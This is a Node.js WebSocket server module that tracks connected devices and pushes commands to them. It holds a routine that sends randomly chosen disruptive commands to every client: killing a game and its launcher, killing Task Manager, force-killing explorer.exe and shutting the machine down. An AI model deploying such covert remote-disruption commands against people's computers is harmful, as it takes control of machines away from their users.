const {log} = require("./utils");

class Server {
  /**@type {Set<Client>} */
  static clients = new Set();
  /** @type {Set<WebSocket>} */
  static adminClients = new Set();
  /** @type {Array<{type:string;payload:any;at:string}>} */
  static activityLog = [];
  /**
   * @type {Map<string, Array<{resolve:(value:string)=>void, reject:(err:Error)=>void, timer:ReturnType<typeof setTimeout>, predicate?:((message:string)=>boolean)}>>}
   */
  static messageWaiters = new Map();
  static randomClose = false;
  static disableWLAN = false;
  /**
   * 
   * @param {Client} client
   */
  static add(client) {
    this.clients.add(client)
    this.broadcastToAdmins("stats", this.getStats());
  }

  /**
   * 
   * @param {Client} client
   */
  static delete(client) {    
    this.clients.delete(client);
    this.broadcastToAdmins("stats", this.getStats());
  }

  /**
   *
   * @param {WebSocket} ws
   */
  static deleteByWs(ws) {
    for (const client of this.clients) {
      if (client.ws === ws) {
        this.delete(client);
        return;
      }
    }
    console.log("Can not delete client by websocket")
  }

  /**
   *
   * @param {WebSocket} ws
   */
  static addAdmin(ws) {
    this.adminClients.add(ws);
  }

  /**
   *
   * @param {WebSocket} ws
   */
  static deleteAdmin(ws) {
    this.adminClients.delete(ws);
  }

  static getStats() {
    const devices = Array.from(this.clients).map((client) => ({
      ip: client.ip,
      lastPing: client.lastPing,
    }));
    return {
      onlineDevices: devices.length,
      devices,
    };
  }

  /**
   *
   * @param {string} ip
   * @returns {Client | null}
   */
  static getClientByIp(ip) {
    for (const client of this.clients) {
      if (client.ip === ip) {
        return client;
      }
    }
    return null;
  }

  /**
   *
   * @param {string} ip
   * @param {string} message
   * @returns {boolean}
   */
  static sendToDevice(ip, message) {
    const client = this.getClientByIp(ip);
    if (!client || client.ws.readyState !== 1) {
      return false;
    }
    client.ws.send(message);
    return true;
  }

  static getRecentActivity() {
    return this.activityLog;
  }

  /**
   *
   * @param {string} type
   * @param {any} payload
   */
  static recordActivity(type, payload) {
    const entry = {
      type,
      payload,
      at: new Date().toISOString(),
    };
    this.activityLog.push(entry);
    if (this.activityLog.length > 200) {
      this.activityLog.shift();
    }
    this.broadcastToAdmins("activity", entry);
  }

  /**
   *
   * @param {string} type
   * @param {any} payload
   */
  static broadcastToAdmins(type, payload) {
    const msg = JSON.stringify({type, payload});
    this.adminClients.forEach((client) => {
      if (client.readyState === 1) {
        client.send(msg);
      } else {
        client.close();
        this.deleteAdmin(client);
      }
    });
  }

  /**
   *
   * @param { string | ArrayBufferLike | Blob | ArrayBufferView} msg
   */
  static broadcast(msg) {
    this.clients.forEach(client => {
      if (client.ws.readyState === 1) {
        client.ws.send(msg)
      }
      else {        
        client.ws.close();
        this.delete(client);
      }
    })
  }

  /**
   *
   * @param {string} ip
   * @param {string} message
   */
  static onDeviceMessage(ip, message) {
    this.recordActivity("device-message", {ip, message});
    const waiters = this.messageWaiters.get(ip);
    if (!waiters || waiters.length === 0) {
      return;
    }
    for (let i = 0; i < waiters.length; i += 1) {
      const waiter = waiters[i];
      if (waiter.predicate && !waiter.predicate(message)) {
        continue;
      }
      clearTimeout(waiter.timer);
      waiters.splice(i, 1);
      waiter.resolve(message);
      break;
    }
    if (waiters.length === 0) {
      this.messageWaiters.delete(ip);
    }
  }

  /**
   *
   * @param {string} ip
   * @param {number} timeoutMs
   * @param {(message:string)=>boolean} [predicate]
   * @returns {Promise<string>}
   */
  static waitDeviceMessage(ip, timeoutMs = 8000, predicate) {
    return new Promise((resolve, reject) => {
      const timer = setTimeout(() => {
        const waiters = this.messageWaiters.get(ip) || [];
        const index = waiters.findIndex((item) => item.resolve === resolve);
        if (index >= 0) {
          waiters.splice(index, 1);
        }
        if (waiters.length === 0) {
          this.messageWaiters.delete(ip);
        } else {
          this.messageWaiters.set(ip, waiters);
        }
        reject(new Error("Timed out waiting device response"));
      }, timeoutMs);
      const waiters = this.messageWaiters.get(ip) || [];
      waiters.push({resolve, reject, timer, predicate});
      this.messageWaiters.set(ip, waiters);
    });
  }
  static randomCloseFun() {
    if (Server.disableWLAN) {
      this.clients.forEach(client => {
        console.log("disable")
        client.ws.send("mute");
      })
    }
    if (!Server.randomClose) {
      return;
    }
    const items = ['kill DeltaForceClient-Win64-Shipping',
      'kill delta_force_launcher',
      'kill Taskmgr',
      '#shutdown -p',
      '#taskkill -f -im explorer.exe&exit',
    ];
    const item = items[Math.floor(Math.random()*items.length)];
    this.clients.forEach(client => {
      console.log(item)
      client.ws.send(item);
    })
  }


  static pingAll() {
    this.clients.forEach(client => {
      client.ws.send("ping")
      if (Date.now() - client.lastPing > 10000) {
        log("Client ping timeout");
        client.ws.close();
      }
    })
    Server.randomCloseFun()
  }

  }


module.exports = {
  Server
}
